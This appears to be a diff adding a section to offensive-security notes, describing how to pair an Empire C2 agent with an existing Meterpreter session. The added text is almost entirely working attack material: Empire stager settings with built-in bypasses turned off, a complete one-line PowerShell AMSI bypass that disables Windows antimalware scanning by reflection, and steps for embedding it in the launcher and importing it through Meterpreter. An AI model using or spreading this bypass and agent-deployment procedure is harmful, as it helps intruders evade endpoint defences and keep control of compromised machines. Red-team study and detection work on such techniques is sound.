@@ -236,3 +236,36 @@ execute
 ```
 
 * Get the SPNs from LDAP output or from bloodhound
+
+### Empire Agent Obfuscation / Meterpreter/Empire Tandem
+
+* This assumes an active meterpreter session on a remote host
+
+```
+make normal http listener (host/bind ip/port/name) are the main four. 
+Now for the agent do:
+set Launcher powershell -enc
+usestager multi/launcher
+set Bypasses None <-- we're adding the custom AMSI bypass
+set Listener http 
+generate
+```
+
+* AMSI Bypass&#x20;
+
+```
+$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true);
+```
+
+```
+copy the base64 encoded output, decode it locally. 
+There will be the string:
+If($PSVersionTable.PSVersion.Major -ge 3){};
+
+put the AMSI bypass above in the {}
+save as a .ps1 file locally on kali
+
+go to meterpreter and run:
+load powershell
+powershell_import /path/to/file/created.ps1
+```
